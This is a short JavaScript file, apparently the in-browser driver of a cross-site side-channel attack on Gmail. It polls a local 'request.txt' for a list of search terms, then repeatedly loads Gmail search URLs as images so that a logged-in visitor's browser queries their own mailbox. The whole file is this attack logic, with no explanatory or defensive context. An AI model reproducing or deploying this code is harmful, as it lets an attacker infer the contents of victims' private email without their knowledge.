function compare_arrays(array_1 = [], array_2 = []) {
    if (array_1.length != array_2.length)
            return false;
    for (var i=0; i<array_1.length; i++)
            if (array_1[i] != array_2[i])
                    return false;
    return true;
}

function makeRequest(iterator = 0, total = 0, alphabet = [], ref = "", timeout = 3000) {
    jQuery.get("request.txt").done(function(data) {
        var input = data.split('\n');
        var new_ref = input[0];
        var new_alphabet = input[1].split(',');
        if (!compare_arrays(alphabet, new_alphabet) || ref != new_ref) {
                setTimeout(function() {
                        makeRequest(0, total, new_alphabet, new_ref);
                }, 5000);
                return;
        }
        var search = alphabet[iterator];
        var request = "https://mail.google.com/mail/u/0/x/?s=q&q=" + search;
        var img = new Image();
        img.src = request;
        iterator = iterator >= alphabet.length - 1 ? 0 : ++iterator;
        console.log("making request %d: %s", total++, request);
        setTimeout(function() {
                makeRequest(iterator, total, alphabet, ref);
        }, timeout);
    }).fail(function() {
        setTimeout(makeRequest(), 10000);
        return
    });
    return;
}
makeRequest();
